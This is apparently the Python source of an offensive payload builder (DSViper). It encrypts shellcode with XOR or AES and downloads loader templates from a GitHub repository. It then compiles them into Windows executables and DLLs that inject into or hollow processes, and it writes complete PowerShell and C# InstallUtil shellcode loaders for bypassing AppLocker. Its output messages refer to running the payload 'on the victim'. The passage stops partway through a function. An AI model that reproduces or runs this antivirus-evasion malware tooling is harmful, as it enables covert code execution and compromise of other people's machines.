# !/usr/bin/python3
import os
import argparse
from rich.console import Console
from rich import print
import sys
import random
from os import urandom
import requests
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hashlib

console = Console()

def xorEncrypt(plaintext, key):
    print("\n")

    ciphertext = bytearray()
    for i in range(len(plaintext)):
        # XOR each byte with the key in a repeating pattern
        ciphertext.append(plaintext[i] ^ key[i % len(key)])

    return bytes(ciphertext)
def AESencrypt(plaintext, key):
    k = hashlib.sha256(key).digest()  # Derive the AES key using SHA-256
    iv = 16 * b'\x00'  # Initialization vector (16 bytes, zeroed)
    plaintext = pad(plaintext, AES.block_size)  # Pad the plaintext
    cipher = AES.new(k, AES.MODE_CBC, iv)  # Create AES cipher in CBC mode
    ciphertext = cipher.encrypt(plaintext)  # Encrypt the padded plaintext
    return ciphertext, key
def AESencrypt_with_iv(plaintext, key, iv):
    k = hashlib.sha256(key).digest()  # Derive a 32-byte key using SHA-256
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)  # Use the passed IV
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext, key, iv
def HAVOCone(payload_name):
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m"

    with open(payload_name, "rb") as file:
        content = file.read()
    key = [random.randint(0, 255) for _ in range(16)]
    ciphertext = xorEncrypt(content, key)

    XOR_key = bytes(key)
    with open("key.bin", "wb") as f:
        f.write(XOR_key)

    XOR_code = bytes(ciphertext)
    with open("code.bin", "wb") as f:
        f.write(XOR_code)

    with open("resources.rc", "wb") as f:
        f.write('dhanushcode56   RCDATA   "code.bin"\n'.encode('utf-8'))
        f.write('dhanushkey1    RCDATA   "key.bin"\n'.encode('utf-8'))

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/xoxo.cpp"
    try:
        res = requests.get(url)
        with open("xoxo.cpp", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(
            ["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_xor.exe", "xoxo.cpp", "resources.res", "-fpermissive",
             "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_xor.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["code.bin", "key.bin", "resources.res", "resources.rc", "xoxo.cpp"]
    for file in files:
        os.remove(file)
def HAVOCtwo(payload_name):
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m"
    with open(payload_name, "rb") as file:
        content = file.read()
    KEY = urandom(16)

    ciphertext, key = AESencrypt(content, KEY)

    with open("key.bin", "wb") as key_file:
        key_file.write(KEY)

    # Save the encrypted payload to a binary file (AEScode.bin)
    with open("code.bin", "wb") as code_file:
        code_file.write(ciphertext)

    with open("resources.rc", "wb") as f:
        f.write('dhanushcode56   RCDATA   "code.bin"\n'.encode('utf-8'))
        f.write('dhanushkey1    RCDATA   "key.bin"\n'.encode('utf-8'))

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/kumaes.cpp"
    try:
        res = requests.get(url)
        with open("AESbypass.cpp", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_AES.exe", "AESbypass.cpp", "resources.res",
                        "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_AES.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["code.bin", "key.bin", "resources.res", "resources.rc", "AESbypass.cpp"]
    for file in files:
        os.remove(file)
def HAVOCfour(payload_name):
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m"

    with open(payload_name, "rb") as file:
        content = file.read()
    key = [random.randint(0, 255) for _ in range(16)]
    ciphertext = xorEncrypt(content, key)

    XOR_key = bytes(key)
    with open("key.bin", "wb") as f:
        f.write(XOR_key)

    XOR_code = bytes(ciphertext)
    with open("code.bin", "wb") as f:
        f.write(XOR_code)

    with open("resources.rc", "wb") as f:
        f.write('dhanushcode56   RCDATA   "code.bin"\n'.encode('utf-8'))
        f.write('dhanushkey1    RCDATA   "key.bin"\n'.encode('utf-8'))

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/procinj2.cpp"
    try:
        res = requests.get(url)
        with open("Processinj_XOR.cpp", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(
            ["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_spoolsv.exe", "Processinj_XOR.cpp", "resources.res",
             "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_spoolsv.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["code.bin", "key.bin", "resources.res", "resources.rc", "Processinj_XOR.cpp"]
    for file in files:
        os.remove(file)
def HAVOCsixAES_withhollow(payload_name):
    with open(payload_name, "rb") as file:
        content = file.read()
    KEY = urandom(16)

    ciphertext, key = AESencrypt(content, KEY)

    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
    key_str = ', '.join(f'0x{byte:02x}' for byte in KEY)
    aeskey = f"unsigned char ke185hams[] = {{ {key_str} }};"
    aescode = f"unsigned char itsthecod345[] = {{ {ciphertext_str} }};"

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/hollow_aes.cpp"

    try:
        res = requests.get(url)
        content1 = res.text
        content1 = content1.replace('unsigned char ke185hams[] = {};', aeskey)
        content1 = content1.replace('unsigned char itsthecod345[] = {};', aescode)
        with open("hollow_aes.cpp", "wb") as f:
            f.write(content1.encode('utf-8'))
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(
            ["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_hollow.exe", "hollow_aes.cpp", "-fpermissive",
             "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"[green bold][*]Payload successfully created as DSViper_hollow.exe[/green bold]")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["hollow_aes.cpp"]
    for file in files:
        os.remove(file)
def HAVOCseven_dynamic_dhanush(payload_name):
    with open(payload_name, "rb") as file:
        content = file.read()
    key = [random.randint(0, 255) for _ in range(16)]
    ciphertext = xorEncrypt(content, key)

    XOR_key = bytes(key)
    with open("key.bin", "wb") as f:
        f.write(XOR_key)

    XOR_code = bytes(ciphertext)
    with open("code.bin", "wb") as f:
        f.write(XOR_code)

    with open("resources.rc", "wb") as f:
        f.write('dhanushcode56   RCDATA   "code.bin"\n'.encode('utf-8'))
        f.write('dhanushkey1    RCDATA   "key.bin"\n'.encode('utf-8'))

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/hollow_dynamic.cpp"
    try:
        res = requests.get(url)
        with open("hollow.cpp", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(
            ["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_selfdelete.exe", "hollow.cpp", "resources.res",
             "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"[green bold][*]Payload successfully created as DSViper_selfdelete.exe[/green bold]")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["code.bin", "key.bin", "resources.res", "resources.rc", "hollow.cpp"]
    for file in files:
        os.remove(file)
def HAVOCeightAES_hollow_dll(payload_name):
    with open(payload_name, "rb") as file:
        content = file.read()
    KEY = urandom(16)

    ciphertext, key = AESencrypt(content, KEY)

    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
    key_str = ', '.join(f'0x{byte:02x}' for byte in KEY)
    aeskey = f"unsigned char ke185hams[] = {{ {key_str} }};"
    aescode = f"unsigned char itsthecod345[] = {{ {ciphertext_str} }};"

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/dll/dll_dynamic_hollow.cpp"
    url2 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/dll/process.cpp"
    try:
        res1 = requests.get(url2)
        with open("process.cpp", "wb") as f:
            f.write(res1.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        res = requests.get(url)
        content1 = res.text
        content1 = content1.replace('unsigned char ke185hams[] = {};', aeskey)
        content1 = content1.replace('unsigned char itsthecod345[] = {};', aescode)
        with open("hollow_aes_dll.cpp", "wb") as f:
            f.write(content1.encode('utf-8'))
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["x86_64-w64-mingw32-g++", "-shared", "-o", "dhanushgowda.dll", "hollow_aes_dll.cpp", "-lws2_32",
                        "-lwinhttp", "-lcrypt32", "-static-libgcc", "-static-libstdc++", "-fpermissive"], check=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # x86_64-w64-mingw32-g++ -shared -o imm32.dll dll.cpp -lws2_32 -lwinhttp -lcrypt32 -static-libgcc -static-libstdc++ -fpermissive
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_dll.exe", "process.cpp", "-fpermissive"],
                       check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        print(f"[green bold][*]Payload successfully created as DSViper_dll.exe and dhanushgowda.dll[/green bold]")
        print(
            f"[green bold][*]Transfer both the executable and the dll on the victim in the same directory,execute DSViper_havocdll.exe[/green bold]")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["hollow_aes_dll.cpp", "process.cpp"]
    for file in files:
        os.remove(file)
def HAVOCnine_enc(payload_name):
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m"

    with open(payload_name, "rb") as file:
        content = file.read()
    key = [random.randint(0, 255) for _ in range(16)]
    ciphertext = xorEncrypt(content, key)

    XOR_key = bytes(key)
    with open("key.bin", "wb") as f:
        f.write(XOR_key)

    XOR_code = bytes(ciphertext)
    with open("code.bin", "wb") as f:
        f.write(XOR_code)

    with open("resources.rc", "wb") as f:
        f.write('dhanushcode56   RCDATA   "code.bin"\n'.encode('utf-8'))
        f.write('dhanushkey1    RCDATA   "key.bin"\n'.encode('utf-8'))

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/procinj_enc.cpp"
    try:
        res = requests.get(url)
        with open("Processinj_XOR.cpp", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(
            ["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_exp.exe", "Processinj_XOR.cpp", "resources.res",
             "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper_exp.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["code.bin", "key.bin", "resources.res", "resources.rc", "Processinj_XOR.cpp"]
    for file in files:
        os.remove(file)
def powershell_havocevery(payload_name):
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m"
    YELLOW = "\033[93m"

    with open(payload_name, "rb") as file:
        content = file.read()
    key = [random.randint(0, 255) for _ in range(16)]
    ciphertext = xorEncrypt(content, key)

    XOR_key = bytes(key)

    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
    key_str = ', '.join(f'0x{byte:02x}' for byte in XOR_key)

    ps1_code = (
            '$Kernel32 = @"\n'
            'using System;\n'
            'using System.Runtime.InteropServices;\n'
            'public class Kernel32 {\n'
            '    [DllImport("kernel32.dll", SetLastError = true)]\n'
            '    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n'
            '\n'
            '    [DllImport("kernel32.dll", SetLastError = true)]\n'
            '    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);\n'
            '\n'
            '    [DllImport("kernel32.dll", SetLastError = true)]\n'
            '    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n'
            '\n'
            '    [DllImport("kernel32.dll", SetLastError = true)]\n'
            '    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);\n'
            '\n'
            '    [DllImport("kernel32.dll", SetLastError = true)]\n'
            '    public static extern bool CloseHandle(IntPtr hObject);\n'
            '\n'
            '    [DllImport("ntdll.dll", SetLastError = true)]\n'
            '    public static extern uint ZwUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);\n'
            '}\n'
            '"@\n'
            '\n'
            'Add-Type $Kernel32\n'
            '\n'
            '# XOR decryption key\n'
            '[Byte[]] $XORkey = ' + key_str + '\n'
                                              '\n'
                                              '# Encrypted shellcode\n'
                                              '[Byte[]] $XORshellcode = ' + ciphertext_str + '\n'
                                                                                             '\n'
                                                                                             '\n'
                                                                                             '# Target process to hollow\n'
                                                                                             '$processName = "notepad.exe"\n'
                                                                                             '\n'
                                                                                             '# Start target process in suspended state\n'
                                                                                             '$processInfo = New-Object System.Diagnostics.ProcessStartInfo\n'
                                                                                             '$processInfo.FileName = "c:\\windows\\system32\\notepad.exe"\n'
                                                                                             '$processInfo.CreateNoWindow = $true\n'
                                                                                             '$processInfo.UseShellExecute = $false\n'
                                                                                             '$process = [System.Diagnostics.Process]::Start($processInfo)\n'
                                                                                             '\n'
                                                                                             '# Get handle to target process\n'
                                                                                             '$PROCESS_ALL_ACCESS = 0x1F0FFF\n'
                                                                                             '$hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $process.Id)\n'
                                                                                             '\n'
                                                                                             '# Unmap the target process\'s memory (if needed)\n'
                                                                                             '[Kernel32]::ZwUnmapViewOfSection($hProcess, [IntPtr]::Zero)\n'
                                                                                             '\n'
                                                                                             '# Allocate memory for the shellcode in the target process\n'
                                                                                             '$MEM_COMMIT = 0x1000\n'
                                                                                             '$MEM_RESERVE = 0x2000\n'
                                                                                             '$PAGE_EXECUTE_READWRITE = 0x40\n'
                                                                                             '$size = $XORshellcode.Length\n'
                                                                                             '$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)\n'
                                                                                             '\n'
                                                                                             'for ($i = 0; $i -lt $XORshellcode.Length; $i++) {\n'
                                                                                             '    $XORshellcode[$i] = $XORshellcode[$i] -bxor $XORkey[$i % $XORkey.Length]\n'
                                                                                             '}\n'
                                                                                             '\n'
                                                                                             '# Write the decrypted shellcode into the allocated memory\n'
                                                                                             '[UIntPtr]$bytesWritten = [UIntPtr]::Zero\n'
                                                                                             '$result = [Kernel32]::WriteProcessMemory($hProcess, $addr, $XORshellcode, $size, [ref]$bytesWritten)\n'
                                                                                             '\n'
                                                                                             '\n'
                                                                                             '# Create a remote thread to execute the shellcode\n'
                                                                                             '$hThread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)\n'
                                                                                             '\n'
                                                                                             '\n'
                                                                                             'Write-Host "Letsss goooo Broskiiiii" -ForegroundColor Green\n'
                                                                                             '\n'
                                                                                             '# Clean up\n'
                                                                                             '[Kernel32]::CloseHandle($hThread)\n'
                                                                                             '[Kernel32]::CloseHandle($hProcess)\n'
    )
    with open("DSViper.ps1", "w") as cpp_file:
        cpp_file.write(ps1_code)
    print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper.ps1")
def applocker_installutil(payload_name):
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m"
    YELLOW = "\033[93m"

    with open(payload_name, "rb") as file:
        content = file.read()
    key = [random.randint(0, 255) for _ in range(16)]
    ciphertext = xorEncrypt(content, key)

    XOR_key = bytes(key)

    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
    key_str = ', '.join(f'0x{byte:02x}' for byte in XOR_key)

    installutil = (
            "using System;\n"
            "using System.Diagnostics;\n"
            "using System.Reflection;\n"
            "using System.Configuration.Install;\n"
            "using System.Runtime.InteropServices;\n"
            "\n"
            "public class Program\n"
            "{\n"
            "    public static void Main()\n"
            "    {\n"
            "        // Generic code execution\n"
            "        Console.WriteLine(\"I am a normal program!\");\n"
            "    }\n"
            "}\n"
            "\n"
            "[System.ComponentModel.RunInstaller(true)]\n"
            "public class Sample : Installer\n"
            "{\n"
            "    [DllImport(\"kernel32.dll\", SetLastError = true)]\n"
            "    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n"
            "\n"
            "    [DllImport(\"kernel32.dll\", SetLastError = true)]\n"
            "    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);\n"
            "\n"
            "    [DllImport(\"kernel32.dll\", SetLastError = true)]\n"
            "    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);\n"
            "\n"
            "    [DllImport(\"kernel32.dll\", SetLastError = true)]\n"
            "    public static extern bool CloseHandle(IntPtr hObject);\n"
            "\n"
            "    [DllImport(\"kernel32.dll\")]\n"
            "    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);\n"
            "\n"
            "    public override void Uninstall(System.Collections.IDictionary savedState)\n"
            "    {\n"
            "        string targetProcess = \"notepad.exe\"; // Target process\n"
            "        byte[] encryptedShellcode = new byte[] { " + ciphertext_str + " };\n"
                                                                                   "\n"
                                                                                   "        byte[] key = new byte[] { " + key_str + " };\n"
                                                                                                                                    "\n"
                                                                                                                                    "        // Decrypt the shellcode using XOR\n"
                                                                                                                                    "        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];\n"
                                                                                                                                    "\n"
                                                                                                                                    "        Process process = Process.Start(targetProcess);\n"
                                                                                                                                    "\n"
                                                                                                                                    "        IntPtr hProcess = OpenProcess(0x1F0FFF, false, process.Id);\n"
                                                                                                                                    "\n"
                                                                                                                                    "        IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decryptedShellcode.Length, 0x3000, 0x40);\n"
                                                                                                                                    "\n"
                                                                                                                                    "        for (int i = 0; i < encryptedShellcode.Length; i++)\n"
                                                                                                                                    "        {\n"
                                                                                                                                    "            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ key[i % key.Length]);\n"
                                                                                                                                    "        }\n"
                                                                                                                                    "\n"
                                                                                                                                    "        IntPtr bytesWritten;\n"
                                                                                                                                    "        WriteProcessMemory(hProcess, allocatedMemory, decryptedShellcode, (uint)decryptedShellcode.Length, out bytesWritten);\n"
                                                                                                                                    "\n"
                                                                                                                                    "        IntPtr threadHandle;\n"
                                                                                                                                    "        CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out threadHandle);\n"
                                                                                                                                    "\n"
                                                                                                                                    "        CloseHandle(hProcess);\n"
                                                                                                                                    "    }\n"
                                                                                                                                    "}\n"
    )

    with open("applocker.cs", "w") as cs_file:
        cs_file.write(installutil)

    try:
        subprocess.run(["mcs", "-r:System.Configuration.Install.dll", "applocker.cs"], check=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as applocker.exe")
        print(
            f"{GREEN}{BOLD}[*]Run this command 'c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U applocker.exe'")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        print("make sure to run 'sudo apt install mono-complete' before using option 11")

    files = ["applocker.cs"]
    for file in files:
        os.remove(file)
def applocker_installutil2(payload_name):
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m"
    YELLOW = "\033[93m"

    with open(payload_name, "rb") as file:
        content = file.read()
    key = [random.randint(0, 255) for _ in range(16)]
    ciphertext = xorEncrypt(content, key)

    XOR_key = bytes(key)

    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
    key_str = ', '.join(f'0x{byte:02x}' for byte in XOR_key)

    installutil = (
            "using System;\n"
            "using System.Diagnostics;\n"
            "using System.Reflection;\n"
            "using System.Configuration.Install;\n"
            "using System.Runtime.InteropServices;\n"
            "\n"
            "public class Program\n"
            "{\n"
            "    public static void Main()\n"
            "    {\n"
            "        // Generic code execution\n"
            "        Console.WriteLine(\"I am a normal program!\");\n"
            "    }\n"
            "}\n"
            "\n"
            "[System.ComponentModel.RunInstaller(true)]\n"
            "public class Sample : Installer\n"
            "{\n"
            "    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n"
            "    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);\n"
            "\n"
            "    [DllImport(\"kernel32.dll\")]\n"
            "    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n"
            "\n"
            "    [DllImport(\"kernel32.dll\")]\n"
            "    static extern UInt32 WaitForSingleObject(IntPtr hHandle,UInt32 dwMilliseconds);\n"
            "\n"
            "    [DllImport(\"kernel32.dll\")]\n"
            "    static extern IntPtr GetCurrentProcess();\n"
            "\n"
            "    public override void Uninstall(System.Collections.IDictionary savedState)\n"
            "    {\n"
            "        byte[] buf = new byte[] { " + ciphertext_str + " };\n"
                                                                    "\n"
                                                                    "        byte[] key = new byte[] { " + key_str + " };\n"
                                                                                                                     "\n"
                                                                                                                     "        // Decrypt the shellcode using XOR\n"
                                                                                                                     "        //byte[] decryptedShellcode = new byte[encryptedShellcode.Length];\n"
                                                                                                                     "        for (int i = 0; i < buf.Length; i++)\n"
                                                                                                                     "        {\n"
                                                                                                                     "            buf[i] = (byte)(buf[i] ^ key[i % key.Length]);\n"
                                                                                                                     "        }\n"
                                                                                                                     "\n"
                                                                                                                     "        // Step 2: Allocate memory in the current process\n"
                                                                                                                     "        int size = buf.Length;\n"
                                                                                                                     "\n"
                                                                                                                     "        IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, (UInt32)size, 0x1000, 0x40, 0);\n"
                                                                                                                     "\n"
                                                                                                                     "        Marshal.Copy(buf, 0, addr, size);\n"
                                                                                                                     "\n"
                                                                                                                     "        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n"
                                                                                                                     "\n"
                                                                                                                     "        WaitForSingleObject(hThread, 0xFFFFFFFF);\n"
                                                                                                                     "    }\n"
                                                                                                                     "}"
    )

    with open("applocker2.cs", "w") as cs_file:
        cs_file.write(installutil)

    try:
        subprocess.run(["mcs", "-r:System.Configuration.Install.dll", "applocker2.cs"], check=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as applocker2.exe")
        print(
            f"{GREEN}{BOLD}[*]Run this command 'c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U applocker2.exe'")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        print("make sure to run 'sudo apt install mono-complete' before using option 11")

    files = ["applocker2.cs"]
    for file in files:
        os.remove(file)
def indirect(payload_name):
    with open(payload_name, "rb") as file:
        content = file.read()
    KEY = urandom(16)

    ciphertext, key = AESencrypt(content, KEY)

    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
    key_str = ', '.join(f'0x{byte:02x}' for byte in KEY)
    aeskey = f"unsigned char AESkey[] = {{ {key_str} }};"
    aescode = f"unsigned char cool[] = {{ {ciphertext_str} }};"

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/indirect.c"
    url2 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.asm"
    url3 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.h"

    try:
        res = requests.get(url)
        content1 = res.text
        content1 = content1.replace('unsigned char AESkey[] = {};', aeskey)
        content1 = content1.replace('unsigned char cool[] = {};', aescode)
        with open("indirect.c", "wb") as f:
            f.write(content1.encode('utf-8'))
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        res = requests.get(url2)
        with open("syscalls.asm", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)
    print

    try:
        res = requests.get(url3)
        with open("syscalls.h", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["uasm", "-win64", "syscalls.asm", "-Fo=syscalls.obj"], check=True, stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE)
        subprocess.run(["x86_64-w64-mingw32-gcc", "-c", "indirect.c", "-o", "dhanush.obj"], check=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(["x86_64-w64-mingw32-gcc", "dhanush.obj", "syscalls.o", "-o", "DSViper_indirect.exe"],
                       check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        print(f"[green bold][*]Payload successfully created as DSViper_indirect.exe[/green bold]")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["syscalls.asm", "indirect.c", "syscalls.h", "syscalls.o", "dhanush.obj"]
    for file in files:
        os.remove(file)
def enumpagew(payload_name):
    with open(payload_name, "rb") as file:
        content = file.read()
    KEY = urandom(16)
    iv = urandom(16)

    ciphertext, key, iv = AESencrypt_with_iv(content, KEY, iv)

    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
    key_str = ', '.join(f'0x{byte:02x}' for byte in KEY)
    iv_str = ', '.join(f'0x{byte:02x}' for byte in iv)

    aeskey = f"unsigned char ke185hams[] = {{ {key_str} }};"
    aescode = f"unsigned char itsthecod345[] = {{ {ciphertext_str} }};"
    aesiv = f"unsigned char AESiv[] = {{ {iv_str} }};"

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/enumpage.cpp"

    try:
        res = requests.get(url)
        content1 = res.text
        content1 = content1.replace('unsigned char ke185hams[] = {};', aeskey)
        content1 = content1.replace('unsigned char itsthecod345[] = {};', aescode)
        content1 = content1.replace('unsigned char AESiv[] = {};', aesiv)
        with open("hollow_aes.cpp", "wb") as f:
            f.write(content1.encode('utf-8'))
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper_12.exe", "hollow_aes.cpp", "-fpermissive",
                        "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"[green bold][*]Payload successfully created as DSViper_12.exe[/green bold]")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["hollow_aes.cpp"]
    for file in files:
        os.remove(file)
def indirect2(payload_name):
    with open(payload_name, "rb") as file:
        content = file.read()
    KEY = urandom(16)

    ciphertext, key = AESencrypt(content, KEY)

    ciphertext_str = ', '.join(f'0x{byte:02x}' for byte in ciphertext)
    key_str = ', '.join(f'0x{byte:02x}' for byte in KEY)
    aeskey = f"unsigned char AESkey[] = {{ {key_str} }};"
    aescode = f"unsigned char cool[] = {{ {ciphertext_str} }};"

    url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/indi_ker_ntdll.cpp"
    url2 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.asm"
    url3 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.h"

    try:
        res = requests.get(url)
        content1 = res.text
        content1 = content1.replace('unsigned char AESkey[] = {};', aeskey)
        content1 = content1.replace('unsigned char cool[] = {};', aescode)
        with open("indirect.c", "wb") as f:
            f.write(content1.encode('utf-8'))
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        res = requests.get(url2)
        with open("syscalls.asm", "wb") as f:
            f.write(res.content)
